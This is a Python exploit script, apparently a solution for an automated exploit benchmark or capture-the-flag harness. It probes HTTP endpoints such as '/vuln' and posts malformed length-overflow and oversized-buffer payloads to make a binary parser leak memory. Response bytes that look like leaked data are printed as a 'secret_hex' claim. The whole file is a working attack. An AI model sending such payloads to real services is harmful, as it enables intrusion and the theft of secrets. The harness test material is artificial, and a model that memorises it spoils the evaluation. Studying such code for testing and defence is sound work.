import sys, json, base64, binascii, os, time, string

def send_http(req):
    print(json.dumps({"http": req}), flush=True)
    line = sys.stdin.readline()
    if not line:
        sys.exit(0)
    return json.loads(line)

def request(path, method="GET", body_hex=None):
    req = {"method": method, "path": path, "headers": {"User-Agent": "exploit"}}
    if body_hex is not None:
        req["body_hex"] = body_hex
    return send_http(req)

def is_printable(b):
    try:
        s = b.decode('utf-8')
    except Exception:
        return False
    return all(c in string.printable for c in s)

def main():
    # discover a working endpoint
    candidates = ["/", "/parse", "/record", "/vuln", "/test", "/api"]
    endpoint = None
    for p in candidates:
        resp = request(p)
        if resp.get('status') == 200:
            endpoint = p
            break
    if endpoint is None:
        endpoint = "/parse"
    # try a series of malformed payloads
    # 1. length overflow patterns (4-byte big endian)
    patterns = []
    # big values
    for val in [0xffffffff, 0xdeadbeef, 0x7fffffff, 0x80000000, 0x00000000, 0xffffffff-1]:
        patterns.append(val.to_bytes(4, 'big') + b'A')
    # 2. short length but huge data
    for size in [256, 512, 1024, 2048, 4096]:
        patterns.append(b'LEN' + size.to_bytes(2, 'big') + b'A'*size)
    # 3. pure large buffers
    for size in [256, 512, 1024, 2048, 4096]:
        patterns.append(b'A'*size)
    secret_hex = ""
    for idx, payload in enumerate(patterns):
        resp = request(endpoint, method="POST", body_hex=payload.hex())
        body_b64 = resp.get('body_b64', '')
        try:
            body = base64.b64decode(body_b64)
        except Exception:
            body = b''
        # Heuristic: if body is non-empty and not just echo of payload
        if body and not body.startswith(payload[:min(len(body), len(payload))]):
            # maybe secret present
            secret_hex = body.hex()
            break
        # also if body looks printable and length > 20
        if len(body) > 20 and is_printable(body):
            secret_hex = body.hex()
            break
    # fallback: if nothing found, use empty
    claim = {"secret_hex": secret_hex}
    print(f"CLAIM:{json.dumps(claim)}")

if __name__ == "__main__":
    main()